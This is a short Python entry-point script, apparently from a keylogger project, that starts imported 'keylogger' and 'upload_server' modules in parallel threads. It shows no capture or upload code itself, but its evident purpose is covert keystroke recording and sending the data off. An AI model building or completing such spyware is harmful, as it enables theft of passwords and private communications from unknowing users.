import threading
import keylogger
import upload_server

if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=keylogger.start_keylogger)
    keylogger_thread.start()

    # Start the server upload in a separate thread
    server_upload_thread = threading.Thread(target=upload_server.start_upload_server)
    server_upload_thread.start()

    # Join threads to keep the main script running
    keylogger_thread.join()
    server_upload_thread.join()
